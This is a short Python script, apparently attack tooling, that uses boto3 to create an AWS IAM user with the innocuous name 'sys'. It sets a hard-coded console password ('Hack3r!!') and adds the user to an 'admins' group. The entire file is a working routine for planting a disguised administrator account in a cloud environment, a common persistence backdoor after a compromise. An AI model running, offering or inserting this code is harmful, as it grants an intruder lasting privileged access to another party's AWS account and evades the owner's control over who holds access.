import botocore
import boto3

iamSession = boto3.session.Session(region_name="us-east-1").client(service_name='iam')

newUser = iamSession.create_user(UserName = "sys")
newPass = iamSession.create_login_profile(UserName = "sys", Password = "Hack3r!!")
newGroupAdd = iamSession.add_user_to_group(UserName = "sys", GroupName = "admins")